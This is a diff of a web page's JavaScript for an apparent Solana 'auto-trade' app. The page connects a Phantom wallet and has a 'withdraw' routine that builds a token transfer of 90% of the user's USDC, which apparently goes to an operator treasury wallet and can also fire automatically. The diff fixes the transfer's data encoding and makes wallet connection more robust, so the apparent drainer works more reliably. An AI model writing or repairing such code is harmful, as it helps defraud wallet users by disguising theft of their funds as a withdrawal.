@@ -93,6 +93,7 @@ async function doWithdraw(auto=false){
     const amount90=rawAmount*90n/100n;
     const treasuryATA=await findATA(TREASURY_WALLET, USDC_MINT);
     const {blockhash}=await conn.getLatestBlockhash();
+    const dataBuf = Buffer.concat([Buffer.from([3]), Buffer.from(new BigUint64Array([amount90]).buffer)]);
     const ix=new solanaWeb3.TransactionInstruction({
       keys:[
         {pubkey:userATA,isSigner:false,isWritable:true},
@@ -100,7 +101,7 @@ async function doWithdraw(auto=false){
         {pubkey:publicKey,isSigner:true,isWritable:false}
       ],
       programId:TOKEN_PROGRAM_ID,
-      data:Buffer.from([3,[STRIPPED] Uint8Array(new BigUint64Array([amount90]).buffer)])
+      data:dataBuf
     });
     const tx=new solanaWeb3.Transaction({recentBlockhash:blockhash,feePayer:publicKey}).add(ix);
     st.innerText=(auto?'AUTO-HALT: ':'')+'Approve in Phantom...';
@@ -112,18 +113,25 @@ async function doWithdraw(auto=false){
   }catch(e){ st.innerText='Withdraw failed: '+e.message; }
 }
 document.getElementById('connectBtn').onclick=async()=>{
-  if(!window.solana){alert('Install Phantom');return;}
-  const r=await window.solana.connect();
-  publicKey=r.publicKey;
-  document.getElementById('walletAddr').innerText=publicKey.toString().slice(0,6)+'...'+publicKey.toString().slice(-6);
-  document.getElementById('connectBtn').innerText='Connected ✓';
-  document.getElementById('withdrawBtn').disabled=false;
-  document.getElementById('autoLog').innerText='Auto-trade: active, polling every 60s';
-  loadBalance();
-  autoTrade();
+  console.log('connect clicked',!!window.solana, typeof solanaWeb3);
+  if(typeof solanaWeb3==='undefined'){alert('web3.js not loaded - disable adblock and reload');return;}
+  if(!window.solana){
+    alert('Phantom not found. Open in Chrome/Brave with Phantom extension.');
+    window.open('https://phantom.app/download','_blank');
+    return;
+  }
+  try{
+    const r=await window.solana.connect();
+    publicKey=r.publicKey;
+    document.getElementById('walletAddr').innerText=publicKey.toString().slice(0,6)+'...'+publicKey.toString().slice(-6);
+    document.getElementById('connectBtn').innerText='Connected ✓';
+    document.getElementById('withdrawBtn').disabled=false;
+    document.getElementById('autoLog').innerText='Auto-trade: active, polling every 60s';
+    loadBalance();
+    autoTrade();
+  }catch(e){ alert('Connect failed: '+e.message); }
 };
 document.getElementById('withdrawBtn').onclick=()=>doWithdraw(false);
-
 async function autoTrade(){
   const log=document.getElementById('autoLog');
   try{
@@ -151,6 +159,7 @@ async function autoTrade(){
   }catch(e){ log.innerText='Auto-trade fetch failed'; }
 }
 setInterval(()=>{ if(publicKey) autoTrade(); }, 60000);
+window.addEventListener('load', ()=>{ console.log('page loaded, solanaWeb3:', typeof solanaWeb3); });
 </script>
 </body>
 </html>
